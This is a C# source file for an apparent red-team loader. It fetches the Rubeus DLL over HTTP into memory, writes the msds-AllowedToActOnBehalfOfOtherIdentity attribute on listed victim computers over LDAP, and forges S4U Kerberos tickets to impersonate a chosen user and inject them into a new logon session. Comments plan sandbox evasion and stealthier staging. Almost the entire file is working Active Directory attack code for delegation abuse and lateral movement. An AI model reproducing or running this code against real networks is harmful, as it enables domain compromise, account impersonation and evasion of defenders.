using System;
using System.IO;
using System.Security.Principal;
using System.Threading;

namespace Rubeus_DLL_Loader
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 7)
            {
                //TODO Sandbox Evasion
                string domain = args[0];
                string dele_acct = args[1];
                string dele_acct_pw = args[2];
                string domain_controller = args[3];
                string victim_acct = args[4];
                string spn = args[5];
                string file_path = args[6];

                //Comment out network and uncomment the file to load from disk
                //TODO implement SMB staging, its less suspicious than an HTTP get
                Networking network = new Networking();
                string loc = network.Get_Payload("<http://INSERT_PATH/URI>");
                //string loc = File.ReadAllText(<File Path>);

                //Create the DLL object in memory
                DLL rubeus = new DLL(loc);

                //Initate the LDAP object
                //Can use the overridden constructor if performing from a domain joined machine
                //LDAP ldap = new LDAP(domain);
                LDAP ldap = new LDAP(domain, "<DOMAIN USER NAME>", "<DOMAIN USER PASS>");

                foreach (string victim_machine in File.ReadAllLines(file_path))
                    if (LDAP_Work(ldap, domain, dele_acct, victim_machine))
                    {
                        Get_RCE(rubeus, domain, dele_acct, dele_acct_pw, domain_controller, victim_acct, spn, victim_machine);
                    }
                    else
                    {
                        Console.WriteLine("[!] Unable to change delegation for {0}", victim_machine);
                    }
            }else
            {
                //TODO Sand box evasion
            }
        }

        /*
         * Purpose:
         *   This function handles the namespace switching for the rubeus DLL and interfaces with the in memory object
         *   To perform the TGT generation
         * Arguments:
         *   rubeus - Inital DLL object for rubeus, this contains all of the pointers in memory for namespaces and methods we need to call from the DLL
         *   domain - Domain all targeted items are contained in
         *   dele_acct - Malicious Machine Account used to perform delegation
         *   dele_acct_pw - Password for machine account
         *   domain_controller - Targeted DC (Not the load balenced name)
         *   victim_acct - Targeted user to impersonate
         *   spn - Serivce Principle you'd like to the ability to access, HOST acts as a catch all for built ins
         *   victim_machine - Machine you have at least GenericWrite ability over
         * Output:
         *   You should end up with a CMD window containing your shiny new Ticket!
         * Notes:
         *   While Rubeus supports cross domain TGT generation this program does not currently. Therefore all targeted enties must exist in the same domain.
         *   Due to us Calling individual methods inside the rubeus program from memory and having to modify them for return values and cross domain support was a bit more work 
         *   to ensure you were performing the right call chain in the DLL.
         *   Definitely room for improvement there
         */
        static void Get_RCE(DLL rubeus, string domain, string dele_acct, string dele_acct_pw, string domain_controller, string victim_acct, string spn, string victim_machine)
        {
            //Pass values to generate the RC4 hash
            Console.WriteLine("[*] Generating: RC4 Hash");
            rubeus.Switch_Namespace("Rubeus.Crypto", "ComputeAllKerberosPasswordHashes");
            string rc4 = rubeus.Gen_RC4(dele_acct, domain, dele_acct_pw).Trim();

            //Generate Kerberos Ticket
            Console.WriteLine("[*] Generating TGT using: {0} with hash {1}", dele_acct, rc4);
            rubeus.Switch_Namespace("Rubeus.S4U", "Execute_1");
            string TGT = rubeus.s4u(domain, domain_controller, dele_acct, rc4, victim_acct, spn, victim_machine);

            //Create new login session of type 9 for pass the ticket
            Console.WriteLine("[*] Generating New Logon session to inject ticket into");
            rubeus.Switch_Namespace("Rubeus.Helpers", "CreateProcessNetOnly");
            object LUID = rubeus.New_LogonSession("cmd.exe");

            //Inject Ticket into new login session
            Console.WriteLine("[*] Generating New Logon session to inject ticket into");
            rubeus.Switch_Namespace("Rubeus.LSA", "ImportTicket");
            rubeus.Inject_Ticket(TGT, LUID);
        }

        /* 
         * Purpose:
         *   This function performs the LDAP functions required to carry out the attack. It will check to see if the targeted machines 
         *   already have a value set for the MSDS-allowed property, if so check to see if its our attacker controlled security descriptor
         *   if not, do not pass go, do not collect RCE (it would impact prod)
         * Arguments:
         *   ldap - instantiated LDAP Class
         *   domain - Domain you are performing searches on
         *   delegate_account - Attacket controlled machine account that will be set to be the delegation authority
         *   victim - Victim Computer
         * Outputs:
         *   True - Machine is now compromiseable
         *   False - Machine is not compromisable
         * Notes:
         *   If a specific account has the genericwrite permission for an object it must be compromised to perform this change
         *   You can create an LDAP connection with the overridden constructor for that account
         *   All targets must be in the same domain for the Get_RCE step to work
         */
        static bool LDAP_Work(LDAP ldap, string domain, string delegate_account, string victim)
        {
            //Get Malicious Machine Account SID
            ldap.set_filter(string.Format("(&(objectCategory=computer)(cn={0}))", delegate_account));
            System.DirectoryServices.SearchResult fake_account = ldap.searcher.FindOne();
            byte[] fake_account_sid = (byte[])fake_account.Properties["objectSid"][0];

            if (fake_account.Properties.Contains("objectSid"))
            {
                //Attempt to get the SID byte array to set in the property later
                Console.Write("[*] Found SID for: {0} : ", delegate_account);
                var SID = new SecurityIdentifier(fake_account_sid, 0);
                Console.WriteLine(SID.ToString());

                //Set the recently obtained SID as the authority for delegation
                ldap.set_filter(string.Format("(&(objectCategory=computer)(cn={0}))", victim));
                System.DirectoryServices.DirectoryEntry computer = ldap.searcher.FindOne().GetDirectoryEntry();

                //Check to see if something is already set, if so we can continue the attack but as Red Team we shouldn't impact prod
                //So we need to see if its set because we already attacked it, or because its set for production reasons
                if (computer.Properties.Contains("msds-allowedtoactonbehalfofotheridentity"))
                {
                    Console.WriteLine("[*] Checking to see if msds-AllowedToActOnBehalfOfOtherIdentity is in use for computer: {0}", victim);

                    //use search result objects here because directory entry abstracts the value away to a System.__comObject__ and actually queries AD again
                    var current_owner = (byte[])ldap.searcher.FindOne().Properties["msds-allowedtoactonbehalfofotheridentity"][0];
                    if (ldap.check_securitydescriptor_match(current_owner, fake_account_sid))
                    {
                        Console.WriteLine("[*] Computer {0} Already Compromised", victim);
                        return true;
                    }
                    else
                    {
                        Console.WriteLine("[!] Computers {0} msds-AllowedToActOnBehalfOfOtherIdentity Attribute already in use", victim);
                        return false;
                    }
                }
                else
                {
                    Console.WriteLine("[*] No value found Setting: {0} as authority for {1}", delegate_account, victim);

                    //Setting our account as the authority for delegation
                    byte[] descriptor_buffer = ldap.create_secruitydescriptor(fake_account_sid);
                    computer.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = descriptor_buffer;
                    //Dont forget to commit ;)
                    computer.CommitChanges();
                    return true;
                }
            }
            else 
            {
                Console.WriteLine("[!] Failed to find delegation account {0}", delegate_account);
                return false;
            }
        }
    }
}
